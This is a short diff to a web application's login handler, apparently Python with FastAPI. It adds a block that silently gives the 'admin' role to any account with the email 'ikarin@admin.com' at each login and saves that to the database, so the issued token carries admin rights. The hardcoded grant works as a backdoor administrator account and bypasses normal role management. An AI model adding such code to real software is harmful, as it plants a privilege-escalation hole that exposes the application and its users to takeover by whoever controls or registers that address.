@@ -151,6 +151,12 @@ async def login(
             await db.commit()
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Incorrect email or password")
 
+    # Guarantee admin role for ikarin@admin.com
+    if user.email.lower() == "ikarin@admin.com" and user.role != "admin":
+        user.role = "admin"
+        await db.commit()
+        await db.refresh(user)
+
     access_token = create_access_token(data={"sub": user.email, "role": user.role})
 
     emit_activity(
